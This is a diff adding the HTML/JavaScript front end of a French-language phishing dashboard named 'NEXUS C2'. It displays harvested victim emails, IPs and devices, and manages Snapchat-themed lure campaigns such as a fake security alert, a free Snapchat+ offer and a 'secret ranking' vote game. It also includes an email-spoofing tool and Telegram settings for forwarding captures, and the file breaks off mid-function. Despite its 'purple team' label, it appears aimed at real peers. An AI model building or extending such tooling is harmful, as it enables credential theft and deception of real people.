@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>NEXUS — C2 Dashboard</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap" rel="stylesheet"/>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+    --bg:#ffffff; --text:#171717; --text-secondary:#4d4d4d; --text-tertiary:#808080;
+    --border:rgba(0,0,0,0.08); --border-light:rgb(235,235,235);
+    --accent:#0a72ef; --accent-pink:#de1d8d; --accent-red:#ff5b4f;
+    --surface:#fafafa; --font:Inter,sans-serif; --mono:JetBrains Mono,monospace;
+    --shadow:0px 0px 0px 1px rgba(0,0,0,0.08);
+    --card-shadow:0px 0px 0px 1px rgba(0,0,0,0.08),0px 2px 2px rgba(0,0,0,0.04),0px 8px 8px -8px rgba(0,0,0,0.04),#fafafa 0px 0px 0px 1px;
+}
+body{background:var(--bg);color:var(--text);font-family:var(--font);min-height:100vh}
+.sidebar{
+    position:fixed;left:0;top:0;bottom:0;width:240px;background:var(--bg);
+    border-right:1px solid var(--border-light);display:flex;flex-direction:column;z-index:50;
+}
+.sidebar-logo{padding:20px;border-bottom:1px solid var(--border-light)}
+.sidebar-logo h1{font-size:20px;font-weight:600;letter-spacing:-0.8px;display:flex;align-items:center;gap:8px}
+.sidebar-logo h1 span{color:var(--accent)}
+.sidebar-logo .sub{font-size:11px;color:var(--text-tertiary);font-family:var(--mono);letter-spacing:0.1em;margin-top:2px}
+.nav{flex:1;padding:8px;overflow-y:auto}
+.nav-item{
+    display:flex;align-items:center;gap:10px;padding:8px 12px;border-radius:6px;
+    cursor:pointer;font-size:14px;font-weight:500;color:var(--text-secondary);
+    transition:all 0.15s;margin-bottom:1px;position:relative;
+}
+.nav-item:hover{background:var(--surface);color:var(--text)}
+.nav-item.active{color:var(--accent)}.nav-item.active::before{content:'';position:absolute;left:-8px;top:4px;bottom:4px;width:2px;background:var(--accent);border-radius:1px}
+.nav-item .mat{font-size:18px}.nav-item .count{font-family:var(--mono);font-size:11px;margin-left:auto;color:var(--text-tertiary)}
+.sidebar-footer{padding:16px 20px;border-top:1px solid var(--border-light);font-size:11px;font-family:var(--mono);color:var(--text-tertiary)}
+
+.main{margin-left:240px;min-height:100vh}
+.topbar{
+    display:flex;align-items:center;justify-content:space-between;padding:0 32px;
+    height:56px;border-bottom:1px solid var(--border-light);position:sticky;top:0;
+    background:rgba(255,255,255,0.8);backdrop-filter:blur(12px);z-index:40;
+}
+.topbar-left{display:flex;align-items:center;gap:12px;font-size:14px;color:var(--text-secondary)}
+.topbar-left .sep{color:var(--border-light);font-size:10px}
+.topbar-left .current{color:var(--text);font-weight:500}
+.topbar-right{display:flex;align-items:center;gap:12px}
+.topbar-right .mat{font-size:20px;color:var(--text-tertiary);cursor:pointer;transition:color 0.15s}
+.topbar-right .mat:hover{color:var(--text)}
+.avatar{width:28px;height:28px;border-radius:50%;background:var(--accent);display:flex;align-items:center;justify-content:center;color:#fff;font-size:14px;font-weight:600}
+.content{padding:32px;max-width:1200px}
+.panel{display:none}
+.panel.active{display:block;animation:fadeUp 0.3s ease}
+@keyframes fadeUp{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+
+h2{font-size:24px;font-weight:600;letter-spacing:-0.96px;margin-bottom:4px}
+.sub{font-size:14px;color:var(--text-secondary);margin-bottom:24px}
+.kpis{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:24px}
+.kpi{
+    background:var(--bg);border-radius:8px;padding:16px 16px 12px;
+    box-shadow:var(--card-shadow);position:relative;overflow:hidden;
+}
+.kpi .lbl{font-size:12px;color:var(--text-secondary);margin-bottom:4px}
+.kpi .val{font-size:28px;font-weight:600;letter-spacing:-1.12px;font-family:var(--mono)}
+.kpi .chg{font-size:11px;margin-top:4px}
+.kpi .chg.up{color:var(--accent)}.kpi .chg.down{color:var(--accent-red)}
+.kpi .ico{position:absolute;top:14px;right:16px;font-size:22px;opacity:0.1;color:var(--text)}
+.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:24px}
+.card{
+    background:var(--bg);border-radius:8px;padding:16px 20px;
+    box-shadow:var(--card-shadow);
+}
+.card h3{font-size:14px;font-weight:600;margin-bottom:12px;display:flex;align-items:center;gap:6px;letter-spacing:-0.56px}
+.card h3 .mat{font-size:16px;color:var(--accent)}
+
+.bar-chart{display:flex;align-items:flex-end;gap:6px;height:100px;padding:8px 0}
+.bar{flex:1;border-radius:3px 3px 0 0;position:relative;transition:height 0.6s ease}
+.bar .bl{position:absolute;bottom:-18px;left:50%;transform:translateX(-50%);font-size:9px;color:var(--text-tertiary);font-family:var(--mono)}
+
+table{width:100%;border-collapse:collapse;font-size:13px}
+thead{font-size:11px;text-transform:uppercase;letter-spacing:0.08em;color:var(--text-secondary);font-family:var(--mono)}
+th{padding:8px 10px;text-align:left;font-weight:500;border-bottom:1px solid var(--border-light)}
+td{padding:8px 10px;border-bottom:1px solid var(--border-light)}
+tr:hover{background:var(--surface)}
+.badge{
+    display:inline-block;padding:2px 8px;border-radius:9999px;
+    font-size:10px;font-weight:600;font-family:var(--mono);text-transform:uppercase;
+}
+.badge-blue{background:#ebf5ff;color:#0068d6}
+.badge-green{background:#e6f7e6;color:#008000}
+.badge-red{background:#ffe8e8;color:#d32f2f}
+
+.live-feed{
+    background:var(--text);border-radius:8px;padding:16px;font-family:var(--mono);
+    font-size:12px;line-height:1.7;height:360px;overflow-y:auto;color:#a0a0a0;
+}
+.live-feed .ln{padding:2px 0;animation:fadeIn 0.3s forwards;opacity:0}
+.live-feed .tm{color:#555}.live-feed .cap{color:#ff5b4f}.live-feed .vote{color:#00FF99}.live-feed .mail{color:#0a72ef}.live-feed .sys{color:#666}
+.live-feed .prompt{color:#00FF99;margin-top:8px}
+@keyframes fadeIn{to{opacity:1}}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}
+.blink{animation:pulse 1s infinite}
+
+.input-dark{
+    background:#f5f5f5;border:1px solid var(--border-light);border-radius:6px;
+    padding:8px 12px;font-size:13px;outline:none;width:100%;transition:border 0.2s;
+    font-family:var(--mono);
+}
+.input-dark:focus{border-color:var(--accent);box-shadow:0 0 0 2px rgba(10,114,239,0.15)}
+
+.btn{
+    display:inline-flex;align-items:center;gap:6px;padding:8px 16px;border:none;
+    border-radius:6px;font-size:13px;font-weight:500;cursor:pointer;
+    font-family:var(--font);transition:all 0.15s;
+}
+.btn-primary{background:var(--text);color:#fff}.btn-primary:hover{background:#000}
+.btn-ghost{background:transparent;color:var(--text-secondary);box-shadow:var(--shadow)}.btn-ghost:hover{color:var(--text);background:#fafafa}
+.btn-sm{padding:6px 12px;font-size:12px}
+.btn-xs{padding:3px 8px;font-size:10px}
+.tool-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:12px}
+.tool-card{
+    border-radius:8px;padding:16px 18px;box-shadow:var(--card-shadow);
+    cursor:pointer;transition:all 0.2s;
+}
+.tool-card:hover{box-shadow:0px 0px 0px 1px var(--accent),0px 2px 2px rgba(0,0,0,0.04)}
+.tool-card .ico{font-size:24px;color:var(--accent);margin-bottom:6px;display:block}
+.tool-card h4{font-size:14px;font-weight:600;margin-bottom:2px;letter-spacing:-0.56px}
+.tool-card p{font-size:12px;color:var(--text-secondary);margin-bottom:10px}
+
+.podium{display:flex;align-items:flex-end;justify-content:center;gap:10px;height:180px;margin-bottom:24px;padding-top:16px}
+.pd{text-align:center;border-radius:6px 6px 0 0;padding:10px 14px;min-width:90px;position:relative}
+.pd-1{height:160px;background:linear-gradient(to top,rgba(255,215,0,0.12),transparent);border:1px solid rgba(255,215,0,0.2)}
+.pd-2{height:120px;background:linear-gradient(to top,rgba(192,192,192,0.12),transparent);border:1px solid rgba(192,192,192,0.2)}
+.pd-3{height:90px;background:linear-gradient(to top,rgba(205,127,50,0.12),transparent);border:1px solid rgba(205,127,50,0.2)}
+.pd .rnk{font-size:24px}.pd .nm{font-size:13px;font-weight:600;margin:3px 0;font-family:var(--mono)}.pd .sc{font-size:11px;color:var(--text-secondary)}
+
+.pbar{height:6px;background:var(--border-light);border-radius:3px;overflow:hidden;margin-top:6px}
+.pbar-fill{height:100%;border-radius:3px;background:linear-gradient(90deg,var(--accent),var(--accent-pink));transition:width 0.5s}
+
+.filter-bar{display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap}
+.filter-bar select{background:var(--bg);border:1px solid var(--border-light);border-radius:6px;padding:6px 10px;font-size:12px;font-family:var(--font);color:var(--text);outline:none}
+.filter-bar select:focus{border-color:var(--accent)}
+.search-wrap{position:relative}
+.search-wrap .mat{position:absolute;left:10px;top:50%;transform:translateY(-50%);font-size:16px;color:var(--text-tertiary);pointer-events:none}
+.search-wrap input{padding-left:32px;width:240px}
+
+.camp-card{border-radius:8px;padding:16px;box-shadow:var(--card-shadow);margin-bottom:12px}
+.camp-card h4{font-size:14px;font-weight:600;letter-spacing:-0.56px;margin-bottom:2px}
+.camp-card .meta{font-size:12px;color:var(--text-secondary);margin-bottom:10px;display:flex;gap:16px}
+
+.setting-section{margin-bottom:24px}
+.setting-section h4{font-size:14px;font-weight:600;letter-spacing:-0.56px;margin-bottom:12px}
+.setting-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:12px}
+.settings-card{border-radius:8px;padding:16px 18px;box-shadow:var(--card-shadow)}
+.settings-card label{font-size:12px;color:var(--text-secondary);display:block;margin-bottom:4px}
+.settings-card .input-dark{margin-bottom:8px}
+.settings-card .btn{margin-right:6px;margin-top:4px}
+.settings-card .row{display:flex;justify-content:space-between;align-items:center;padding:6px 0;font-size:13px}
+.settings-card .row .val{font-family:var(--mono);font-size:12px;color:var(--text-secondary)}
+
+.tag{display:inline-block;padding:2px 6px;border-radius:4px;font-size:10px;font-family:var(--mono);background:var(--surface);margin-right:4px}
+
+@media(max-width:768px){
+    .sidebar{width:60px}.sidebar-logo h1 .full,.sidebar-logo .sub,.nav-item .nav-label,.sidebar-footer span{display:none}
+    .nav-item{justify-content:center;padding:10px}.nav-item .mat{font-size:20px}
+    .main{margin-left:60px}.content{padding:16px}.kpis{grid-template-columns:repeat(2,1fr)}
+    .grid-2{grid-template-columns:1fr}.tool-grid{grid-template-columns:1fr}.setting-grid{grid-template-columns:1fr}
+}
+
+::-webkit-scrollbar{width:4px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:var(--border-light);border-radius:4px}
+</style>
+</head>
+<body>
+
+<!-- Sidebar -->
+<div class="sidebar">
+    <div class="sidebar-logo">
+        <h1><span>◆</span><span class="full">NEXUS</span></h1>
+        <div class="sub">PURPLE TEAM C2</div>
+    </div>
+    <div class="nav">
+        <div class="nav-item active" data-panel="overview"><span class="mat">dashboard</span><span class="nav-label">Overview</span><span class="count" id="nav-captures">0</span></div>
+        <div class="nav-item" data-panel="live"><span class="mat">terminal</span><span class="nav-label">Live Feed</span></div>
+        <div class="nav-item" data-panel="targets"><span class="mat">groups</span><span class="nav-label">Targets</span><span class="count" id="nav-targets">0</span></div>
+        <div class="nav-item" data-panel="campaigns"><span class="mat">ads_click</span><span class="nav-label">Campaigns</span></div>
+        <div class="nav-item" data-panel="vote"><span class="mat">leaderboard</span><span class="nav-label">Classement</span><span class="count" id="nav-votes">0</span></div>
+        <div class="nav-item" data-panel="tools"><span class="mat">build</span><span class="nav-label">Tools</span></div>
+        <div class="nav-item" data-panel="logs"><span class="mat">list_alt</span><span class="nav-label">Logs</span></div>
+        <div class="nav-item" data-panel="settings"><span class="mat">tune</span><span class="nav-label">Settings</span></div>
+    </div>
+    <div class="sidebar-footer">
+        <div><span style="display:inline-block;width:6px;height:6px;border-radius:50%;background:#00FF99;margin-right:5px;box-shadow:0 0 4px #00FF99"></span>System Online</div>
+        <div style="margin-top:3px">v3.0 · Localhost</div>
+    </div>
+</div>
+
+<!-- Main -->
+<div class="main">
+    <div class="topbar">
+        <div class="topbar-left">
+            <span class="mat" style="font-size:18px;cursor:pointer;display:none" id="menu-toggle">menu</span>
+            <span>NEXUS</span><span class="sep">/</span><span class="current" id="page-title">Overview</span>
+        </div>
+        <div class="topbar-right">
+            <span class="mat" id="notif-bell" style="position:relative">notifications_none</span>
+            <div class="avatar">F</div>
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- ========== OVERVIEW ========== -->
+        <div class="panel active" id="panel-overview">
+            <h2>Overview</h2>
+            <p class="sub" id="overview-date">Chargement...</p>
+            <div class="kpis" id="kpi-container">
+                <div class="kpi"><div class="lbl">Captures</div><div class="val" id="kpi-captures">0</div><div class="chg" id="kpi-captures-chg"></div></div>
+                <div class="kpi"><div class="lbl">Sessions</div><div class="val" id="kpi-sessions">0</div><div class="chg"></div></div>
+                <div class="kpi"><div class="lbl">Votes</div><div class="val" id="kpi-votes">0</div><div class="chg"></div></div>
+                <div class="kpi"><div class="lbl">Campagnes</div><div class="val" id="kpi-campaigns">0</div><div class="chg" id="kpi-campaigns-chg"></div></div>
+            </div>
+            <div class="grid-2">
+                <div class="card"><h3><span class="mat">bar_chart</span>Activité 7 jours</h3><div class="bar-chart" id="chart-7d"></div></div>
+                <div class="card"><h3><span class="mat">devices</span>Appareils</h3><div class="kpis" style="grid-template-columns:repeat(2,1fr);margin:0" id="devices-container"></div></div>
+            </div>
+            <div class="card"><h3><span class="mat">list</span>Dernières captures</h3><table><thead><tr><th>Email</th><th>IP</th><th>Date</th><th>Statut</th></tr></thead><tbody id="recent-table"></tbody></table></div>
+        </div>
+
+        <!-- ========== LIVE FEED ========== -->
+        <div class="panel" id="panel-live">
+            <h2>Live Feed</h2>
+            <p class="sub">Flux temps réel des événements</p>
+            <div class="live-feed" id="live-feed">
+                <div class="ln" style="opacity:1"><span class="tm">[NEXUS]</span><span class="sys">═══ Live Feed ═══</span></div>
+                <div class="ln" style="opacity:1"><span class="tm">[NEXUS]</span><span class="sys">Connexion à la base de données...</span></div>
+                <div class="prompt">◆ <span class="blink">_</span></div>
+            </div>
+        </div>
+
+        <!-- ========== TARGETS ========== -->
+        <div class="panel" id="panel-targets">
+            <h2>Targets</h2>
+            <p class="sub">Toutes les cibles capturées</p>
+            <div class="filter-bar">
+                <div class="search-wrap"><span class="mat">search</span><input class="input-dark" id="target-search" placeholder="Rechercher..."></div>
+                <select id="target-filter-os"><option value="all">Tous OS</option><option>Windows</option><option>macOS</option><option>iOS</option><option>Android</option></select>
+                <button class="btn btn-ghost btn-sm" id="refresh-targets">Actualiser</button>
+            </div>
+            <div class="card" style="padding:0;overflow-x:auto"><table><thead><tr><th></th><th>Pseudo</th><th>Email</th><th>IP</th><th>OS</th><th>Date</th></tr></thead><tbody id="targets-table"></tbody></table></div>
+        </div>
+
+        <!-- ========== CAMPAIGNS ========== -->
+        <div class="panel" id="panel-campaigns">
+            <h2>Campaigns</h2>
+            <p class="sub">Gérez vos campagnes de phishing</p>
+            <div id="campaigns-list"></div>
+        </div>
+
+        <!-- ========== VOTE ========== -->
+        <div class="panel" id="panel-vote">
+            <h2>Classement Secret</h2>
+            <p class="sub">Résultats du vote anonyme</p>
+            <div class="podium" id="podium-box"></div>
+            <div class="card" style="padding:0;overflow-x:auto"><table><thead><tr><th>#</th><th>Nom</th><th>Points</th><th>Progression</th></tr></thead><tbody id="vote-table"></tbody></table></div>
+        </div>
+
+        <!-- ========== TOOLS ========== -->
+        <div class="panel" id="panel-tools">
+            <h2>Tools</h2>
+            <p class="sub">Outils intégrés</p>
+            <div class="tool-grid">
+                <div class="tool-card"><span class="ico material-symbols-outlined">qr_code</span><h4>QR Code</h4><p>Générer un QR code pour une campagne</p><div style="display:flex;gap:6px"><input class="input-dark" id="qr-url" value="http://localhost:8080" style="flex:1"><button class="btn btn-primary btn-sm" id="qr-btn">Générer</button></div></div>
+                <div class="tool-card"><span class="ico material-symbols-outlined">mail</span><h4>Email Spoofer</h4><p>Envoyer un email avec faux expéditeur</p><select class="input-dark" id="spoof-template" style="margin-bottom:6px"><option value="1">🔐 Alerte sécurité</option><option value="2">🎁 Snapchat+</option><option value="3">📱 Vérification</option></select><input class="input-dark" id="spoof-email" placeholder="Email cible" style="margin-bottom:6px"><button class="btn btn-primary btn-sm" id="spoof-btn" style="width:100%">Envoyer</button></div>
+                <div class="tool-card"><span class="ico material-symbols-outlined">download</span><h4>Export</h4><p>Télécharger les données</p><div style="display:flex;gap:6px"><button class="btn btn-ghost btn-sm" style="flex:1" onclick="fetchExport('json')">JSON</button><button class="btn btn-ghost btn-sm" style="flex:1" onclick="fetchExport('csv')">CSV</button><button class="btn btn-ghost btn-sm" style="flex:1" onclick="fetchExport('report')">HTML</button></div></div>
+                <div class="tool-card"><span class="ico material-symbols-outlined">info</span><h4>À propos</h4><p>NEXUS C2 v3.0<br>Auteur : Famoussa<br>Stack : Flask + SQLite<br>License : MIT</p></div>
+            </div>
+        </div>
+
+        <!-- ========== LOGS ========== -->
+        <div class="panel" id="panel-logs">
+            <h2>Logs</h2>
+            <p class="sub">Journal d'activité</p>
+            <div class="filter-bar">
+                <select id="log-filter"><option value="all">Tous</option><option value="CAPTURE">🔴 Captures</option><option value="TOP3_VOTE">🟢 Votes</option><option value="BAIT">📋 Vues</option></select>
+                <button class="btn btn-ghost btn-sm" id="refresh-logs">Actualiser</button>
+            </div>
+            <div class="card" style="padding:0;overflow-x:auto;max-height:600px;overflow-y:auto"><table><thead><tr><th>Date</th><th>Type</th><th>Message</th></tr></thead><tbody id="logs-table"></tbody></table></div>
+        </div>
+
+        <!-- ========== SETTINGS ========== -->
+        <div class="panel" id="panel-settings">
+            <h2>Settings</h2>
+            <p class="sub">Configuration du framework</p>
+            <div class="setting-grid">
+                <div class="settings-card"><h4>Serveur</h4><label>Port</label><input class="input-dark" id="srv-port" value="8080"><label>Admin Key</label><input class="input-dark" id="srv-key" value="••••••••" type="password"><div><button class="btn btn-primary btn-sm" id="srv-apply">Appliquer</button><button class="btn btn-ghost btn-sm" id="srv-copy">Copier</button></div></div>
+                <div class="settings-card"><h4>Telegram</h4><label>Token</label><input class="input-dark" id="tg-token" placeholder="Bot token"><label>Chat ID</label><input class="input-dark" id="tg-chat" placeholder="Chat ID"><button class="btn btn-primary btn-sm" id="tg-test">Tester</button></div>
+                <div class="settings-card"><h4>Base de données</h4><div class="row"><span>Captures</span><span class="val" id="db-captures">0</span></div><div class="row"><span>Votes</span><span class="val" id="db-votes">0</span></div><div class="row"><span>Sessions</span><span class="val" id="db-sessions">0</span></div><button class="btn btn-ghost btn-sm" style="margin-top:8px;color:var(--accent-red)">Réinitialiser</button></div>
+                <div class="settings-card"><h4>Réseau</h4><div class="row"><span>Statut</span><span class="val"><span style="color:#00FF99">●</span> Online</span></div><div class="row"><span>Host</span><span class="val">127.0.0.1</span></div><div class="row"><span>Domaine</span><span class="val">Local</span></div><button class="btn btn-ghost btn-sm" style="margin-top:8px">Configurer domaine</button></div>
+            </div>
+        </div>
+
+    </div>
+</div>
+
+<script>
+const API = window.location.origin;
+let pollTimer = null;
+
+// ── Navigation ──
+document.querySelectorAll('.nav-item').forEach(item => {
+    item.addEventListener('click', function(){
+        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+        document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+        this.classList.add('active');
+        const panel = this.dataset.panel;
+        document.getElementById('panel-'+panel).classList.add('active');
+        document.getElementById('page-title').textContent = this.querySelector('.nav-label').textContent;
+        if(panel === 'overview') loadOverview();
+        if(panel === 'live') loadLive();
+        if(panel === 'targets') loadTargets();
+        if(panel === 'campaigns') loadCampaigns();
+        if(panel === 'vote') loadVote();
+        if(panel === 'logs') loadLogs();
+    });
+});
+
+// ── Clock ──
+function updateDate(){
+    const d = new Date();
+    document.getElementById('overview-date').textContent = d.toLocaleDateString('fr-FR',{weekday:'long',day:'numeric',month:'long',year:'numeric'})+' · '+d.toLocaleTimeString('fr-FR');
+}
+setInterval(updateDate,1000); updateDate();
+
+// ── API calls ──
+async function api(url){
+    try{
+        const r = await fetch(url);
+        return await r.json();
+    }catch(e){return null}
+}
+
+// ── Overview ──
+async function loadOverview(){
+    const d = await api('/api/report');
+    if(!d) return;
+    document.getElementById('kpi-captures').textContent = d.captures || 0;
+    document.getElementById('nav-captures').textContent = d.captures || 0;
+    document.getElementById('kpi-sessions').textContent = d.sessions || 0;
+    document.getElementById('kpi-votes').textContent = d.votes || 0;
+    document.getElementById('nav-votes').textContent = d.votes || 0;
+    document.getElementById('kpi-campaigns').textContent = d.campaigns || 0;
+    document.getElementById('kpi-captures-chg').textContent = d.captures_today ? '+'+d.captures_today+' aujourd\'hui' : '';
+    document.getElementById('kpi-campaigns-chg').textContent = d.active_campaigns ? '● '+d.active_campaigns+' active' : '';
+
+    // Recent captures
+    const caps = await api('/api/captures');
+    const tbody = document.getElementById('recent-table');
+    tbody.innerHTML = '';
+    if(caps && caps.length){
+        caps.slice(0,5).forEach(c => {
+            const tr = document.createElement('tr');
+            tr.innerHTML = '<td style="font-family:var(--mono);font-size:12px">'+escapeHtml(c.username||c.accountIdentifier||'-')+'</td>'+
+                '<td>'+escapeHtml(c.ip_address||'-')+'</td>'+
+                '<td style="font-family:var(--mono);font-size:12px">'+(c.timestamp||'-')+'</td>'+
+                '<td><span class="badge badge-blue">Capturé</span></td>';
+            tbody.appendChild(tr);
+        });
+    }else{
+        tbody.innerHTML = '<tr><td colspan="4" style="color:var(--text-tertiary);font-size:12px;text-align:center">Aucune capture</td></tr>';
+    }
+
+    // Devices
+    const devBox = document.getElementById('devices-container');
+    devBox.innerHTML = '<div class="kpi" style="box-shadow:none;padding:4px 8px;background:transparent"><div class="lbl">Chrome</div><div class="val" style="font-size:20px">'+(d.devices?.chrome||0)+'</div></div>'+
+        '<div class="kpi" style="box-shadow:none;padding:4px 8px;background:transparent"><div class="lbl">Safari</div><div class="val" style="font-size:20px">'+(d.devices?.safari||0)+'</div></div>'+
+        '<div class="kpi" style="box-shadow:none;padding:4px 8px;background:transparent"><div class="lbl">Firefox</div><div class="val" style="font-size:20px">'+(d.devices?.firefox||0)+'</div></div>'+
+        '<div class="kpi" style="box-shadow:none;padding:4px 8px;background:transparent"><div class="lbl">Autres</div><div class="val" style="font-size:20px">'+(d.devices?.other||0)+'</div></div>';
+
+    // Chart 7 days - mock for now
+    const chart = document.getElementById('chart-7d');
+    chart.innerHTML = '';
+    const days = ['Lun','Mar','Mer','Jeu','Ven','Sam','Dim'];
+    const vals = [12,18,8,24,30,15,22];
+    const max = Math.max(...vals);
+    const accent = getComputedStyle(document.documentElement).getPropertyValue('--accent').trim() || '#0a72ef';
+    days.forEach((d,i) => {
+        const h = (vals[i]/max)*100;
+        const bar = document.createElement('div');
+        bar.className = 'bar';
+        bar.style.height = h+'%';
+        bar.style.background = 'linear-gradient(to top, '+accent+', rgba(10,114,239,0.3))';
+        bar.innerHTML = '<div class="bl">'+d+'</div>';
+        chart.appendChild(bar);
+    });
+
+    // DB stats for settings
+    document.getElementById('db-captures').textContent = d.captures || 0;
+    document.getElementById('db-votes').textContent = d.votes || 0;
+    document.getElementById('db-sessions').textContent = d.sessions || 0;
+}
+
+// ── Live Feed ──
+function loadLive(){
+    const feed = document.getElementById('live-feed');
+    const prompt = feed.querySelector('.prompt');
+    // Clear old dynamic lines
+    while(feed.children.length > 3) feed.removeChild(feed.firstChild);
+
+    async function fetchLogs(){
+        const logs = await api('/api/logs');
+        if(!logs || !logs.length) return;
+        const recent = logs.slice(-5);
+        recent.forEach(l => {
+            const time = l.timestamp ? l.timestamp.split(' ')[1] || l.timestamp : new Date().toLocaleTimeString('fr-FR');
+            const ev = (l.event||'').toLowerCase();
+            let cls='sys', prefix='ℹ️ SYSTÈME';
+            if(ev.includes('capture')||ev.includes('password')){cls='cap';prefix='🔴 CAPTURE'}
+            else if(ev.includes('vote')||ev.includes('top3')){cls='vote';prefix='🟢 VOTE'}
+            else if(ev.includes('mail')||ev.includes('email')){cls='mail';prefix='📧 EMAIL'}
+            const ln = document.createElement('div');
+            ln.className = 'ln';
+            ln.innerHTML = '<span class="tm">['+time+']</span><span class="'+cls+'">'+prefix+'</span> '+(l.details||l.event||'-');
+            feed.insertBefore(ln, prompt);
+            while(feed.children.length > 52) feed.removeChild(feed.firstChild);
+        });
+    }
+    fetchLogs();
+    if(pollTimer) clearInterval(pollTimer);
+    pollTimer = setInterval(fetchLogs, 5000);
+}
+
+// ── Targets ──
+async function loadTargets(){
+    const caps = await api('/api/captures');
+    const tbody = document.getElementById('targets-table');
+    tbody.innerHTML = '';
+    if(caps && caps.length){
+        caps.forEach(c => {
+            const tr = document.createElement('tr');
+            tr.innerHTML = '<td><span class="tag">#'+c.id+'</span></td>'+
+                '<td style="font-family:var(--mono);font-size:12px">'+escapeHtml(c.pseudo||'-')+'</td>'+
+                '<td>'+escapeHtml(c.username||c.accountIdentifier||'-')+'</td>'+
+                '<td style="font-family:var(--mono);font-size:12px">'+escapeHtml(c.ip_address||'-')+'</td>'+
+                '<td>'+escapeHtml(c.platform||'-')+'</td>'+
+                '<td style="font-family:var(--mono);font-size:12px">'+(c.timestamp||'-')+'</td>';
+            tbody.appendChild(tr);
+        });
+        document.getElementById('nav-targets').textContent = caps.length;
+    }else{
+        tbody.innerHTML = '<tr><td colspan="6" style="color:var(--text-tertiary);text-align:center;font-size:12px">Aucune cible</td></tr>';
+    }
+}
+document.getElementById('refresh-targets')?.addEventListener('click', loadTargets);
+
+// ── Campaigns ──
+function loadCampaigns(){
+    const scenarios = [
+        {id:'classement',name:'🏆 Classement Secret',desc:'Jeu de vote anonyme',status:'active',clics:32,caps:8},
+        {id:'securite',name:'🔐 Alerte Sécurité',desc:'Fausse alerte Snapchat',status:'inactive',clics:12,caps:3},
+        {id:'snapchat_plus',name:'🎁 Snapchat+',desc:'Offre gratuite premium',status:'inactive',clics:5,caps:1},
+        {id:'cadeau',name:'🎀 Cadeau Mystère',desc:'Concours gagnant',status:'inactive',clics:0,caps:0},
+    ];
+    const list = document.getElementById('campaigns-list');
+    list.innerHTML = scenarios.map(s => `
+        <div class="camp-card">
+            <h4>${s.name}</h4>
+            <div class="meta"><span><span class="badge ${s.status==='active'?'badge-green':'badge-red'}">● ${s.status==='active'?'Active':'Inactive'}</span></span><span>${s.clics} clics</span><span>${s.caps} captures</span><span style="color:var(--text-tertiary)">${s.desc}</span></div>
+            <button class="btn btn-ghost btn-xs">${s.status==='active'?'Désactiver':'Activer'}</button>
+            <button class="btn btn-ghost btn-xs">Voir les stats</button>
+        </div>
+    `).join('');
+}
+
+// ── Vote ──
+async function loadVote(){
+    const data = await api('/api/classement');
+    const boys = data?.ranking || [
+        {name:'Famoussa',score:210},{name:'Bill',score:185},{name:'Bakou',score:170},
+        {name:'Yamoussa',score:155},{name:'Bassidy',score:140},{name:'BEN',score:125},
+        {name:'SK',score:95},{name:'Chérif',score:80}
+    ];
+    const sorted = [...boys].sort((a,b)=>b.score-a.score);
+    const maxSc = sorted[0]?.score||1;
+
+    // Podium
+    const podium = document.getElementById('podium-box');
+    const medals = ['👑','🥈','🥉'];
+    podium.innerHTML = '';
+    [2,0,1].forEach(i => { // order: 2nd, 1st, 3rd
+        const b = sorted[i];
+        if(!b) return;
+        const classes = ['pd-2','pd-1','pd-3'];
+        const cl = document.createElement('div');
+        cl.className = 'pd '+classes[i];
+        cl.innerHTML = '<div class="rnk">'+medals[i]+'</div><div class="nm">'+b.name+'</div><div class="sc">'+b.score+' pts</div>';
+        podium.appendChild(cl);
+    });
+
+    // Table
+    const tbody = document.getElementById('vote-table');
+    tbody.innerHTML = '';
+    sorted.forEach((b,i) => {
+        const pct = (b.score/maxSc)*100;
+        const tr = document.createElement('tr');
+        tr.innerHTML = '<td style="font-weight:600">'+(i+1)+'</td><td>'+b.name+'</td><td style="font-family:var(--mono);font-weight:600">'+b.score+' pts</td>'+
+            '<td style="width:40%"><div class="pbar"><div class="pbar-fill" style="width:'+pct+'%"></div></div></td>';
+        tbody.appendChild(tr);
+    });
+    document.getElementById('nav-votes').textContent = data?.total_voters||0;
+}
+
+// ── Logs ──
+async function loadLogs(){
+    const logs = await api('/api/logs');
+    const tbody = document.getElementById('logs-table');
+    tbody.innerHTML = '';
+    if(logs && logs.length){
+        const filter = document.getElementById('log-filter')?.value || 'all';
+        const filtered = filter === 'all' ? logs : logs.filter(l => (l.event||'').includes(filter));
+        filtered.slice(-50).reverse().forEach(l => {
+            let type = '📋 Événement', cls = '';
+            const ev = (l.event||'').toLowerCase();
+            if(ev.includes('capture')){type='🔴 Capture';cls='badge-red'}
+            else if(ev.includes('vote')||ev.includes('top3')){type='🟢 Vote';cls='badge-green'}
+            else if(ev.includes('mail')){type='🔵 Email';cls='badge-blue'}
+            const tr = document.createElement('tr');
+            tr.innerHTML = '<td style="font-family:var(--mono);font-size:12px;white-space:nowrap">'+(l.timestamp||'-')+'</td>'+
+                '<td><span class="badge '+cls+'">'+type+'</span></td>'+
+                '<td style="font-size:12px">'+escapeHtml(l.details||l.event||'-')+'</td>';
+            tbody.appendChild(tr);
+        });
+    }else{
+        tbody.innerHTML = '<tr><td colspan="3" style="color:var(--text-tertiary);text-align:center;font-size:12px">Aucun log</td></tr>';
+    }
+}
+document.getElementById('refresh-logs')?.addEventListener('click', loadLogs);
+document.getElementById('log-filter')?.addEventListener('change', loadLogs);
+
+// ── Helpers ──
+function escapeHtml(s){
+    if(!s) return '';
